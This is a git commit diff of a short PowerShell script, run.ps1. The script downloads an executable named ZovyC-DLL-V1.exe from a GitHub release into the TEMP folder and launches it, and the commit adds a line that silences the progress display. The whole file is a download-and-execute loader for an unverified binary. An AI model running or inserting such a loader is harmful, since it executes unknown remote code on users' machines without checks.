45ecb2a7c46b6d0599e79c59ffcd8af79a9881c6
joker55za66-ops <joker55za66@gmail.com>
2026-05-13 03:46:19 +0700

    run.ps1

--- run.ps1
+++ run.ps1
@@ -1,5 +1,9 @@
+$ProgressPreference = 'SilentlyContinue'
+
 $file = "$env:TEMP\ZovyC-DLL-V1.exe"
 
-iwr "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe" -OutFile $file
+$url = "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe"
+
+Invoke-WebRequest $url -OutFile $file
 
 Start-Process $file
